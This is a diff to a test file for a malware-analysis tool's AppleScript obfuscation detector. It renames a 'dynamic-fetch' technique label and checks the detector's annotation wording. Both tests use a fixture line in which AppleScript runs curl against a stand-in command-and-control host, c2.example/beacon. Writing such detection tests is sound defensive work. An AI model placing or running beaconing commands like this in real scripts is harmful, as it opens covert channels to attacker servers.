@@ -754,30 +754,46 @@ test('applescript-obfuscation: Tier A — variant cap prevents combinatorial blo
   assert.ok(sinks.length <= 8, `variant count must respect _AS_MAX_LOOP_VARIANTS cap; got: ${sinks.length}`);
 });
 
-// ── Tier C: Dynamic-fetch IOC annotation ──────────────────────────────────
+// ── Tier C: Runtime-URL-fetch IOC annotation ──────────────────────────────
 
-test('applescript-obfuscation: Tier C — `set X to do shell script "curl URL"` emits dynamic-fetch candidate', () => {
+test('applescript-obfuscation: Tier C — `set X to do shell script "curl URL"` emits runtime-URL-fetch candidate', () => {
   const text =
     `do shell script "echo hi"\n` +
     `property _Other1 : "x"\n` +
     `set _DynVar to do shell script "curl -s https://c2.example/beacon"\n` +
     `property _Other2 : "y"`;
   const cands = d._findAppleScriptObfuscationCandidates(text, {});
-  const dyn = pick(cands, c => c.technique === 'AppleScript Dynamic-Fetch Binding');
-  assert.ok(dyn.length >= 1, `expected dynamic-fetch candidate; got: ${JSON.stringify(host(cands).map(c => c.technique))}`);
+  const dyn = pick(cands, c => c.technique === 'AppleScript Runtime URL Fetch');
+  assert.ok(dyn.length >= 1, `expected runtime-URL-fetch candidate; got: ${JSON.stringify(host(cands).map(c => c.technique))}`);
   assert.equal(dyn[0]._assignedTo, '_DynVar');
   assert.ok(dyn[0]._dynamicSource, 'expected _dynamicSource metadata');
   assert.ok(dyn[0]._dynamicSource.urls.includes('https://c2.example/beacon'));
+  // Annotation body: plain-English `⟨runtime fetch from URL⟩`, not the
+  // legacy `<dynamic-fetch: URL>` internal-vocabulary form.
+  assert.ok(
+    /runtime fetch from/.test(dyn[0].deobfuscated),
+    `annotation body should use plain-English "runtime fetch from"; got ${JSON.stringify(dyn[0].deobfuscated)}`,
+  );
+  assert.ok(
+    !/dynamic-fetch/i.test(dyn[0].deobfuscated),
+    `annotation body must not leak the old "dynamic-fetch" token; got ${JSON.stringify(dyn[0].deobfuscated)}`,
+  );
+  // Singular-URL branch uses `from URL` (no colon); plural uses
+  // `from: URL, URL`. Verify the singular shape here.
+  assert.ok(
+    /\u27e8runtime fetch from https:\/\/c2\.example\/beacon\u27e9/.test(dyn[0].deobfuscated),
+    `expected ⟨runtime fetch from URL⟩ singular form; got ${JSON.stringify(dyn[0].deobfuscated)}`,
+  );
 });
 
-test('applescript-obfuscation: Tier C — dynamic-fetch URL appears as URL IOC', () => {
+test('applescript-obfuscation: Tier C — runtime-URL-fetch URL appears as URL IOC', () => {
   const text =
     `do shell script "echo hi"\n` +
     `property _Other1 : "x"\n` +
     `set _DynVar to do shell script "curl -s https://c2.example/beacon"\n` +
     `property _Other2 : "y"`;
   const cands = d._findAppleScriptObfuscationCandidates(text, {});
-  const dyn = pick(cands, c => c.technique === 'AppleScript Dynamic-Fetch Binding');
+  const dyn = pick(cands, c => c.technique === 'AppleScript Runtime URL Fetch');
   assert.ok(dyn.length >= 1);
   const urls = dyn[0]._patternIocs.map(p => p.url);
   assert.ok(urls.some(u => /https:\/\/c2\.example\/beacon/.test(u)),
